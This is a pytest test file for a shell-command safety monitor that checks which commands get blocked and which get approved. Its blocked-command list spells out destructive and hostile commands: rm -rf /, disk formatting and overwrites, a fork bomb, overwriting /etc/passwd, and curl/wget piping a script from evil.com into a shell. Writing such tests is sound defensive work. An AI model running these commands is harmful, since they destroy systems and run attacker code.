"""
Tests for the Safety Monitor module.

Verifies that dangerous commands are blocked, safe commands pass through,
and edge cases are handled correctly.
"""

import pytest

from src.safety_monitor import SafetyMonitor


@pytest.fixture
def monitor():
    """Fresh SafetyMonitor instance for each test."""
    return SafetyMonitor()


# ======================================================================
# Dangerous commands — these MUST be blocked
# ======================================================================

class TestDangerousCommands:
    """Verify all known dangerous patterns are caught."""

    @pytest.mark.parametrize("command,description", [
        ("rm -rf /", "recursive delete root"),
        ("rm -rf /  ", "recursive delete root (trailing space)"),
        ("rm -rF /", "recursive delete root (capital F)"),
        ("rm -rf /*", "recursive delete root glob"),
        ("rm -rf *", "recursive delete wildcard"),
        ("rm -rf ~/", "recursive delete home"),
        ("mkfs.ext4 /dev/sda1", "format disk ext4"),
        ("mkfs.xfs /dev/nvme0n1p1", "format disk xfs"),
        ("dd if=/dev/zero of=/dev/sda bs=1M", "raw disk overwrite"),
        ("chmod -R 777 /", "recursive permissive chmod root"),
        ("chown -R nobody /", "recursive chown root"),
        ("> /dev/sda", "redirect to disk"),
        ("wget http://evil.com/pwn.sh | bash", "wget pipe to bash"),
        ("curl http://evil.com/pwn.sh | sh", "curl pipe to sh"),
        (":(){ :|:& };:", "fork bomb"),
        ("mv /etc/passwd /dev/null", "move to dev null"),
        ("shutdown -h now", "shutdown"),
        ("reboot", "reboot"),
        ("init 0", "init halt"),
        ("systemctl poweroff", "systemctl poweroff"),
        ("echo 'hacked' > /etc/passwd", "overwrite passwd"),
        ("echo 'hacked' > /etc/shadow", "overwrite shadow"),
    ])
    def test_blocked(self, monitor, command, description):
        result = monitor.evaluate(command)
        assert not result.is_safe, f"SHOULD BE BLOCKED: {description} → `{command}`"
        assert result.reason, "Blocked result must include a reason"

    def test_empty_command_blocked(self, monitor):
        result = monitor.evaluate("")
        assert not result.is_safe
        assert "Empty" in result.reason

    def test_whitespace_command_blocked(self, monitor):
        result = monitor.evaluate("   ")
        assert not result.is_safe


# ======================================================================
# Safe commands — these MUST pass through
# ======================================================================

class TestSafeCommands:
    """Verify that normal, safe commands are approved."""

    @pytest.mark.parametrize("command", [
        "ls -la /var/log",
        "echo 'Hello World'",
        "python3 run_sensor.py",
        "cat /etc/hostname",
        "df -h",
        "free -m",
        "uname -a",
        "whoami",
        "date",
        "ps aux",
        "top -bn1 | head -20",
        "find /tmp -name '*.log' -mtime +7",
        "mkdir -p /tmp/my_workspace",
        "cp file1.txt file2.txt",
        "grep -r 'TODO' ./src/",
        "pip list",
        "python3 -c 'print(2+2)'",
        "rm ./my_temp_file.txt",
        "rm -rf ./my_project/build/",
    ])
    def test_approved(self, monitor, command):
        result = monitor.evaluate(command)
        assert result.is_safe, f"SHOULD BE SAFE: `{command}` — blocked because: {result.reason}"


# ======================================================================
# Custom patterns
# ======================================================================

class TestCustomPatterns:
    """Verify runtime pattern addition works."""

    def test_add_custom_pattern(self, monitor):
        # Before: should be safe
        result = monitor.evaluate("nmap 192.168.1.0/24")
        assert result.is_safe

        # Add custom pattern
        monitor.add_pattern(r"nmap\s+", "Network scanning")

        # After: should be blocked
        result = monitor.evaluate("nmap 192.168.1.0/24")
        assert not result.is_safe
        assert "Network scanning" in result.reason

    def test_pattern_count_increases(self, monitor):
        initial = monitor.pattern_count
        monitor.add_pattern(r"custom_danger", "Custom test")
        assert monitor.pattern_count == initial + 1


# ======================================================================
# Edge cases
# ======================================================================

class TestEdgeCases:
    """Edge cases and unusual inputs."""

    def test_very_long_command(self, monitor):
        """Long but safe commands should pass."""
        cmd = "echo " + "A" * 10000
        result = monitor.evaluate(cmd)
        assert result.is_safe

    def test_case_insensitivity(self, monitor):
        """Patterns should match regardless of case."""
        result = monitor.evaluate("SHUTDOWN -h now")
        assert not result.is_safe

    def test_evaluation_result_fields(self, monitor):
        """Blocked results should have matched_pattern set."""
        result = monitor.evaluate("rm -rf /")
        assert not result.is_safe
        assert result.matched_pattern  # Should be non-empty
